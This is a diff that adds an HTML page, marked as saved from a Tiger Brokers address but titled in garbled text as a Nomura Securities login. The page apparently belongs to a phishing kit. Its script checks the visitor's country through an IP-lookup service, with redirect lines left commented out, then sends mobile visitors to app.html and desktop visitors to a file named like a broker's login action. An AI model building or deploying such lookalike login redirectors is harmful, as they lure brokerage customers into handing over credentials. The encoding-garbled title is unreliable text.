@@ -1,0 +1,56 @@
+source: <!DOCTYPE html>
+<!-- saved from url=(0030)https://www.itiger.com/sg/hans -->
+<html lang="zh-Hans">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>ã­ã°ã¤ã³ | éæè­å¸</title>
+
+		<meta name="viewport" content="width=device-width,initial-scale=1.0">
+		<meta name="format-detection" content="telephone=no">
+		<script>
+
+		fetch('https://ipapi.co/json/')
+			.then(response => response.json())
+			.then(data => {
+				if (data.country !== 'US') {
+					// å¦æä¸æ¯ç¾å½IP
+					//location.href = "#"
+				} else {
+					//location.href = "sg.html"
+				}
+			}).catch(error => {
+				//location.href = "#"
+			});
+
+		function isMobile() {
+			const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+			// å¸¸è§ç§»å¨ç«¯è®¾å¤çå³é®è¯
+			const mobileKeywords = [
+				'Android', 'iPhone', 'iPad', 'iPod', 'Windows Phone',
+				'BlackBerry', 'webOS', 'Opera Mini', 'IEMobile', 'Mobile'
+			];
+
+			return mobileKeywords.some(keyword => userAgent.includes(keyword));
+		}
+
+		window.onload = function () {
+			if (isMobile()) {
+				location.href = "app.html"
+			} else {
+				location.href = "rmfCmnCauSysLgiInitAction.html"
+			}
+
+		}
+	</script>
+
+	</head>
+	<!-- prettier-ignore -->
+
+	<body>
+
+	</body>
+
+</html>
+Page title: ã­ã°ã¤ã³ | éæè­å¸
